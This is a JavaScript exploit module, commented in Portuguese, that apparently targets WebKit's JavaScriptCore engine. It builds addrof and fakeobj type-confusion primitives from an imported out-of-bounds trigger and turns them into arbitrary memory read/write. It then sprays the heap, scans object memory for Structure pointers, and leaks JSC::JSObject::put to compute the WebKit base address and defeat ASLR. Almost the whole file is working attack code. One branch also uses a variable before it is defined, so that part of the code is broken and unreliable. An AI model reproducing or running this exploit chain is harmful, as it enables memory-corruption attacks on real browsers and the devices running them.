// js/script3/testArrayBufferVictimCrash.mjs (v111 - R71 Scanner com Novo Leaker por Iteração)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - A principal mudança é a criação de um NOVO objeto 'leaker' e suas primitivas
//   'arb_read_final_func_local' e 'arb_write_final_func_local' DENTRO do loop do scanner.
//   Isso força o JIT a re-otimizar ou recriar o contexto para cada leitura.
// - Ajustes nos logs para depuração mais granular do scanner.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Nome do módulo atualizado para refletir a nova tentativa de correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v111_R71_ScannerPerIter";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Scanner por Iteração de Leaker ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou.",
        webkit_base_addr: null
    };

    let global_confused_array; // Usaremos 'global_' prefixo para as primitivas de stage1/2
    let global_victim_array;
    let global_addrof_func;
    let global_fakeobj_func;
    let global_leaker;
    let global_arb_read_final_func;
    let global_arb_write_final_func;

    try {
        // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        global_confused_array = [13.37]; 
        global_victim_array = [{ a: 1 }]; 
        
        global_addrof_func = (obj) => {
            global_victim_array[0] = obj;
            return doubleToInt64(global_confused_array[0]);
        };
        global_fakeobj_func = (addr) => {
            global_confused_array[0] = int64ToDouble(addr);
            return global_victim_array[0];
        };

        global_leaker = { obj_prop: null, val_prop: 0 };
        global_arb_read_final_func = (addr, size_bytes = 8) => { 
            global_leaker.obj_prop = global_fakeobj_func(addr);
            const result_64 = doubleToInt64(global_leaker.val_prop);
            if (size_bytes === 4) {
                return result_64.low(); 
            }
            return result_64;
        };
        global_arb_write_final_func = (addr, value, size_bytes = 8) => { 
            global_leaker.obj_prop = global_fakeobj_func(addr);
            if (size_bytes === 4) {
                const current_val_64 = doubleToInt64(global_leaker.val_prop);
                const value_64 = new AdvancedInt64(Number(value) & 0xFFFFFFFF, current_val_64.high());
                global_leaker.val_prop = int64ToDouble(value_64);
            } else {
                global_leaker.val_prop = int64ToDouble(value);
            }
        };
        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida (global) estão prontas para verificação.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({ a: i, b: 0xCAFEBABE, c: i*2, d: i*3 }); 
        }
        const test_obj = spray[500]; 
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr = global_addrof_func(test_obj);
        const value_to_write_phase4 = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr_phase4 = test_obj_addr.add(0x10); 

        logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço ${prop_a_addr_phase4.toString(true)}...`, "info");
        global_arb_write_final_func(prop_a_addr_phase4, value_to_write_phase4);

        const value_read_phase4 = global_arb_read_final_func(prop_a_addr_phase4);
        logS3(`(Verificação Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");

        if (!value_read_phase4.equals(value_to_write_phase4)) {
            throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}`);
        }
        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
        await PAUSE_S3(50); 

        // --- Reiniciar TODO o ambiente para a Fase 5 ---
        logS3("--- PREPARANDO FASE 5: RE-INICIALIZANDO TODO O AMBIENTE OOB E PRIMITIVAS... ---", "critical");
        
        // Zera as referências antigas para ajudar na coleta de lixo
        global_confused_array = null;
        global_victim_array = null;
        global_leaker = null;
        global_addrof_func = null;
        global_fakeobj_func = null;
        global_arb_read_final_func = null;
        global_arb_write_final_func = null;
        await PAUSE_S3(200); 

        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao re-inicializar primitiva OOB para Fase 5.");
        logS3("Ambiente OOB re-inicializado com sucesso.", "good");


        // ============================================================================
        // Primitivas para a Fase 5 (serão passadas para o scanner, ou criadas no loop)
        // ============================================================================
        let current_phase5_confused_array = [13.37];
        let current_phase5_victim_array = [{ dummy: 0 }];
        let current_phase5_leaker_base = { obj_prop: null, val_prop: 0 }; // Base para clonagem
        
        let current_phase5_addrof_func = (obj) => {
            current_phase5_victim_array[0] = obj;
            return doubleToInt64(current_phase5_confused_array[0]);
        };
        let current_phase5_fakeobj_func = (addr) => {
            current_phase5_confused_array[0] = int64ToDouble(addr);
            return current_phase5_victim_array[0];
        };

        logS3("Primitivas L/E base (para Fase 5) re-inicializadas com novos objetos (Arrays Literais) e referências no NOVO ambiente OOB.", "good");

        // --- Warm-up do fakeobj/arb_read_final_func (no novo ambiente) ---
        logS3("--- Warm-up: Realizando operações de L/E de teste para estabilizar a primitiva no novo ambiente... ---", "info");
        // Para o warm-up, usaremos as funções base para ter certeza que o JIT as otimiza
        const warm_up_obj = { warm: 1, up: 2 };
        const warm_up_addr = current_phase5_addrof_func(warm_up_obj);

        const warm_up_leaker = { obj_prop: null, val_prop: 0 };
        const warm_up_arb_read = (addr, size_bytes = 8) => { 
            warm_up_leaker.obj_prop = current_phase5_fakeobj_func(addr);
            const result_64 = doubleToInt64(warm_up_leaker.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };
        const warm_up_arb_write = (addr, value, size_bytes = 8) => { 
            warm_up_leaker.obj_prop = current_phase5_fakeobj_func(addr);
            if (size_bytes === 4) {
                const current_val_64 = doubleToInt64(warm_up_leaker.val_prop);
                const value_64 = new AdvancedInt64(Number(value) & 0xFFFFFFFF, current_val_64.high());
                warm_up_leaker.val_prop = int64ToDouble(value_64);
            } else {
                warm_up_leaker.val_prop = int64ToDouble(value);
            }
        };

        for (let i = 0; i < 5; i++) {
            const temp_read = warm_up_arb_read(warm_up_addr.add(0x10)); 
            warm_up_arb_write(warm_up_addr.add(0x10), temp_read); 
        }
        logS3("Warm-up concluído no novo ambiente. Primitive de L/E possivelmente mais estável.", "info");
        await PAUSE_S3(50); 

        // --- FASE 5: Vazamento do Endereço Base da WebKit ---
        logS3("--- FASE 5: Vazamento do Endereço Base da WebKit (com primitivas em ambiente TOTALMENTE NOVO) ---", "subtest");

        const leak_target_obj = { f: 0xDEADBEEF, g: 0xCAFEBABE, h: 0x11223344 }; 
        for(let i=0; i<1000; i++) { leak_target_obj[`p${i}`] = i; } 
        const leak_target_addr = current_phase5_addrof_func(leak_target_obj);
        logS3(`[Etapa 1] Endereço do objeto alvo (leak_target_obj): ${leak_target_addr.toString(true)}`, "info");
        
        await PAUSE_S3(250); 

        // ============================================================================
        // TESTE DE ESCRITA/LEITURA ARBITRÁRIA NA FASE 5
        // ============================================================================
        logS3("--- TESTE DE L/E NA FASE 5: Verificando funcionalidade no novo contexto... ---", "subtest");
        const test_val_phase5 = new AdvancedInt64(0x5555AAAA, 0xBBBBCCCC);
        const prop_f_addr_phase5 = leak_target_addr.add(0x10); 
        logS3(`    (Fase 5 L/E Test) Escrevendo ${test_val_phase5.toString(true)} no endereço ${prop_f_addr_phase5.toString(true)} (prop 'f')...`, "info");
        
        // Usar as funções de leitura/escrita do warm-up ou as 'globais' para este teste
        // NOTA: Usando as primitivas 'current_phase5' para este teste, que são as que o scanner usará
        const test_phase5_leaker = { obj_prop: null, val_prop: 0 };
        const test_phase5_arb_write = (addr, value, size_bytes = 8) => { 
            test_phase5_leaker.obj_prop = current_phase5_fakeobj_func(addr);
            if (size_bytes === 4) {
                const current_val_64 = doubleToInt64(test_phase5_leaker.val_prop);
                const value_64 = new AdvancedInt64(Number(value) & 0xFFFFFFFF, current_val_64.high());
                test_phase5_leaker.val_prop = int64ToDouble(value_64);
            } else {
                test_phase5_leaker.val_prop = int64ToDouble(value);
            }
        };
        const test_phase5_arb_read = (addr, size_bytes = 8) => { 
            test_phase5_leaker.obj_prop = current_phase5_fakeobj_func(addr);
            const result_64 = doubleToInt64(test_phase5_leaker.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };

        test_phase5_arb_write(prop_f_addr_phase5, test_val_phase5);
        const read_back_val_phase5 = test_phase5_arb_read(prop_f_addr_phase5);
        logS3(`    (Fase 5 L/E Test) Lido de volta: ${read_back_val_phase5.toString(true)}`, "leak");

        if (!read_back_val_phase5.equals(test_val_phase5)) {
            throw new Error(`FALHA CRÍTICA: Teste de L/E da Fase 5 falhou. Escrito: ${test_val_phase5.toString(true)}, Lido: ${read_back_val_phase5.toString(true)}. A primitiva de L/E não está funcionando corretamente no novo contexto.`);
        }
        logS3("--- TESTE DE L/E NA FASE 5: SUCESSO! A primitiva de L/E está funcional no novo contexto. ---", "good");
        await PAUSE_S3(50); 

        // ============================================================================
        // SCANNER DE OFFSETS (agora com um NOVO leaker por iteração)
        // ============================================================================
        logS3("--- SCANNER DE OFFSETS: Varrendo a memória ao redor do objeto alvo... ---", "subtest");
        let found_structure_ptr = null;
        let found_structure_id = null;
        let found_vtable_ptr = null;

        const SCAN_RANGE_START = 0x0; 
        const SCAN_RANGE_END = 0x100; 
        const SCAN_STEP = 0x8;       

        for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += SCAN_STEP) {
            const current_scan_addr = leak_target_addr.add(offset);
            
            // NOVO: Criar um leaker e suas funções de leitura/escrita para CADA ITERAÇÃO
            // Isso deve forçar o JIT a não otimizar/cachear o leaker.obj_prop
            const iter_leaker = { obj_prop: null, val_prop: 0 };
            const iter_arb_read = (addr, size_bytes = 8) => { 
                iter_leaker.obj_prop = current_phase5_fakeobj_func(addr);
                const result_64 = doubleToInt64(iter_leaker.val_prop);
                return (size_bytes === 4) ? result_64.low() : result_64;
            };
            const iter_arb_write = (addr, value, size_bytes = 8) => { 
                iter_leaker.obj_prop = current_phase5_fakeobj_func(addr);
                if (size_bytes === 4) {
                    const current_val_64 = doubleToInt64(iter_leaker.val_prop);
                    const value_64 = new AdvancedInt64(Number(value) & 0xFFFFFFFF, current_val_64.high());
                    iter_leaker.val_prop = int64ToDouble(value_64);
                } else {
                    iter_leaker.val_prop = int64ToDouble(value);
                }
            };

            let val_8_bytes = AdvancedInt64.Zero;
            try {
                val_8_bytes = iter_arb_read(current_scan_addr, 8); 
                logS3(`    [Scanner] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");

                if (!val_8_bytes.equals(AdvancedInt64.Zero) && 
                    (val_8_bytes.high() >>> 16) === 0x7FFF) { 
                    
                    logS3(`    [Scanner] Possível Ponteiro (Structure/Vtable?) em offset ${toHex(offset, 6)}: ${val_8_bytes.toString(true)}`, "leak");
                    
                    if (offset === JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET) {
                        found_structure_ptr = val_8_bytes;
                        logS3(`        [Scanner] --> CANDIDATO FORTE: Ponteiro da Structure em ${toHex(offset, 6)}!`, "good");
                    }
                    else if (offset === 0x0) { 
                        found_vtable_ptr = val_8_bytes;
                        logS3(`        [Scanner] --> CANDIDATO: Ponteiro de Vtable (do próprio objeto) em ${toHex(offset, 6)}!`, "good");
                    }
                }

                if (offset % 4 === 0) { 
                    const val_4_bytes = iter_arb_read(current_scan_addr, 4); 
                    if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x10000) { 
                        logS3(`    [Scanner] Possível StructureID (Uint32) em offset ${toHex(offset, 6)}: ${toHex(val_4_bytes)} (decimal: ${val_4_bytes})`, "leak");
                        if (offset === JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET) {
                             found_structure_id = val_4_bytes;
                             logS3(`        [Scanner] --> CANDIDATO FORTE: StructureID em ${toHex(offset, 6)}!`, "good");
                        }
                    }
                }

            } catch (scan_e) {
                logS3(`    [Scanner] Erro lendo offset ${toHex(offset, 6)}: ${scan_e.message}`, "error");
            }
        }
        logS3("--- FIM DO SCANNER DE OFFSETS ---", "subtest");

        // Decisão com base no scanner
        let structure_addr = null;
        let actual_structure_id = null;

        if (found_structure_ptr && !found_structure_ptr.equals(AdvancedInt64.Zero)) {
            structure_addr = found_structure_ptr;
            logS3(`[DECISÃO] Usando Ponteiro de Structure encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)}: ${structure_addr.toString(true)}`, "info");
        } else if (typeof found_structure_id === 'number' && found_structure_id !== 0) {
            actual_structure_id = found_structure_id;
            logS3(`[DECISÃO] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
            
            const webkit_base_candidate_for_struct_table = jsobject_put_addr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"])); 
            
            if (webkit_base_candidate_for_struct_table.low() === 0 && webkit_base_candidate_for_struct_table.high() === 0) {
                 throw new Error("Erro interno: webkit_base_candidate_for_struct_table é nulo para cálculo da tabela.");
            }

            const structure_table_base_addr = webkit_base_candidate_for_struct_table.add(
                new AdvancedInt64(JSC_OFFSETS.STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE)
            );
            logS3(`[Etapa 2.2] Endereço base da Tabela de Estruturas (estimado): ${structure_table_base_addr.toString(true)}`, "info");
            
            const structure_entry_offset = new AdvancedInt64(actual_structure_id).multiply(new AdvancedInt64(8)); 
            const real_structure_ptr_addr = structure_table_base_addr.add(structure_entry_offset);
            
            // NOVO: Usar um leaker temporário para esta leitura específica também
            const temp_leaker_for_struct_read = { obj_prop: null, val_prop: 0 };
            const temp_arb_read_for_struct = (addr, size_bytes = 8) => { 
                temp_leaker_for_struct_read.obj_prop = current_phase5_fakeobj_func(addr);
                const result_64 = doubleToInt64(temp_leaker_for_struct_read.val_prop);
                return (size_bytes === 4) ? result_64.low() : result_64;
            };

            structure_addr = temp_arb_read_for_struct(real_structure_ptr_addr, 8); 
            logS3(`[Etapa 2.2] Lendo do endereço ${real_structure_ptr_addr.toString(true)} para obter o ponteiro REAL da Estrutura (ID: ${actual_structure_id})...`, "debug");
            logS3(`[Etapa 2.2] Endereço REAL da Estrutura (Structure) do objeto: ${structure_addr.toString(true)}`, "leak");

            if (structure_addr.equals(test_val_phase5) || structure_addr.low() === 0 && structure_addr.high() === 0) { 
                throw new Error("FALHA CRÍTICA: Ponteiro REAL da Estrutura (derivado do ID) é NULO/Inválido ou contaminação persistente.");
            }
            if (!((structure_addr.high() >>> 16) === 0x7FFF || (structure_addr.high() === 0 && structure_addr.low() !== 0))) { 
                 logS3(`[Etapa 2.2] ALERTA: high part do REAL Structure Address (derivado do ID) inesperado: ${toHex(structure_addr.high())}`, "warn");
            }

        } else {
            throw new Error(`FALHA CRÍTICA: Scanner de offsets não encontrou Structure Pointer ou StructureID válidos no objeto alvo. Ultimo vazado leak_target_addr: ${leak_target_addr.toString(true)}`);
        }


        // Continua com a Fase 3 (leitura da vfunc::put) usando o structure_addr encontrado
        const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
        
        // NOVO: Usar um leaker temporário para esta leitura específica também
        const temp_leaker_for_vfunc_read = { obj_prop: null, val_prop: 0 };
        const temp_arb_read_for_vfunc = (addr, size_bytes = 8) => { 
            temp_leaker_for_vfunc_read.obj_prop = current_phase5_fakeobj_func(addr);
            const result_64 = doubleToInt64(temp_leaker_for_vfunc_read.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };

        const jsobject_put_addr = temp_arb_read_for_vfunc(vfunc_put_ptr_addr); 
        logS3(`[Etapa 3] Lendo do endereço ${vfunc_put_ptr_addr.toString(true)} (Structure REAL + 0x18) para obter o ponteiro da vfunc...`, "debug");
        logS3(`[Etapa 3] Endereço vazado da função (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
        if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da função JSC::JSObject::put é NULO ou inválido.");
        if (!((jsobject_put_addr.high() >>> 16) === 0x7FFF || (jsobject_put_addr.high() === 0 && jsobject_put_addr.low() !== 0))) {
            logS3(`[Etapa 3] ALERTA: high part do JSObject::put Address inesperado: ${toHex(jsobject_put_addr.high())}`, "warn");
        }


        // 4. Calcular o endereço base da WebKit.
        const jsobject_put_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
        logS3(`[Etapa 4] Offset conhecido de JSC::JSObject::put: ${jsobject_put_offset.toString(true)}`, "info");

        const webkit_base_addr = jsobject_put_addr.sub(jsobject_put_offset);
        final_result.webkit_base_addr = webkit_base_addr.toString(true);

        logS3(`++++++++++++ SUCESSO! ENDEREÇO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
        logS3(`   ENDEREÇO BASE: ${final_result.webkit_base_addr}`, "vuln");

        final_result.success = true;
        final_result.message = `Vazamento da base da WebKit bem-sucedido. Base encontrada em: ${final_result.webkit_base_addr}.`;

    } catch (e) {
        final_result.success = false;
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        global_confused_array = null;
        global_victim_array = null;
        global_leaker = null;
        global_addrof_func = null;
        global_fakeobj_func = null;
        global_arb_read_final_func = null;
        global_arb_write_final_func = null;
        
        // Limpar também as referências da fase 5
        current_phase5_confused_array = null;
        current_phase5_victim_array = null;
        current_phase5_leaker_base = null;
        current_phase5_addrof_func = null;
        current_phase5_fakeobj_func = null;

        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: {
            success: !!final_result.webkit_base_addr,
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_addr
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Scanner with Per-Iteration Leaker)' }
    };
}
